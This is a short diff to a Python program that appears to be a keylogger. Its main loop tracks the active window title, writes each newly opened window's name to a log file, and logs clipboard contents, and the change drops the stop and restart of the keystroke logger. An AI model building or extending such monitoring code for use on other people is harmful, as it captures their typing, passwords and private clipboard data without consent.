@@ -23,12 +23,10 @@ def main():
         last_window_title = None
         while True:
             active_window_title = wilogger.active_window_title_grabber()
+            # Keys logged between lines 22-25 will be lost.
             if active_window_title != last_window_title:
-                kclogger.stop_keylogger()  # Might not be necessary. Should be tested without this to see if the program is fast enough to note the application name before newly pressed keys.
-                # BUG/TODO: If no logged keys since previous window, then remove \n at the start of the following:
-                f.write(f"OPENED {active_window_title} \n")
-                kclogger.start_keylogger(f)  # Start keylogger again for next loop.
-                last_window_title = active_window_title  # TODO: Being called upon twice. Necessary?
+                f.write(f"\nOPENED {active_window_title} \n")
+                last_window_title = active_window_title
 
             kclogger.log_clipboard(f)
 
